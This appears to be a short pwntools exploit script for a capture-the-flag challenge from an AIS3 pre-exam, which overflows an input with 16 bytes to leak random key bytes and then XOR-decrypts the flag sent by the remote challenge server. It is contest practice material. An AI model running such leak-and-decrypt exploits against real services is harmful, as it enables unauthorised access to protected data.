#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

host = '60.251.236.18'
host = 'pre-exam-pwn.ais3.org'
y = remote( host , 10002 )


y.sendafter( '>' , 'a' * 0x10 )

y.recvuntil( 'a' * 0x10 )

rnd = map( ord , y.recv(16) )

y.recvuntil( ': ' )


flag = map( ord , y.recv(34) )

for i in range( 34 ):
    flag[i] ^= ( 0x61 + rnd[ i % 16 ] ) & 0xff

print ''.join( map( chr , flag ) )


y.interactive()